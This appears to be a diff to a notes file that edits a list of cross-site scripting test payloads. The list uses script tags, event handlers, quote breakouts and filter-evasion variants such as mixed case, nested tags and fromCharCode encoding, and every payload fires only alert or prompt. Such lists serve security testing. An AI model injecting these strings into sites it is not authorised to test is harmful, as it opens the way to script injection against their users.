@@ -13,22 +13,23 @@
 
 ## Payloads
 ```Javascript
-a'"><script>alert(888)</script>
-a"><script>alert(888)</script>
+'"><script>alert(888)</script>
+"><script>alert(888)</script>
 '">');<script>alert(888)</script>
 </title><script>alert(888)</script>
 '; alert(888)'//
 %27;+alert(888);//
-a<script>alert(888)</script>
-a<SCript>alert(888)</SCript>
-a<scri<script>pt>alert(888)</scri</script>pt>
-a<img src='aaa' onerror='alert(888)'/>
-a<script>prompt(888)</script>
-a<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
-a";alert(888);//
-a";alert(888);"
-a';alert(888);//
-a';alert(888);'
+<script>alert(888)</script>
+<SCript>alert(888)</SCript>
+<scri<script>pt>alert(888)</scri</script>pt>
+<img src='aaa' onerror='alert(888)'/>
+<img src=1 oNeRrOr=alert`888`>
+<script>prompt(888)</script>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
+";alert(888);//
+";alert(888);"
+';alert(888);//
+';alert(888);'
 /"><script>alert(888)</script>
 <BODY ONLOAD=alert(888)>
 "><svg onload=alert(888)>
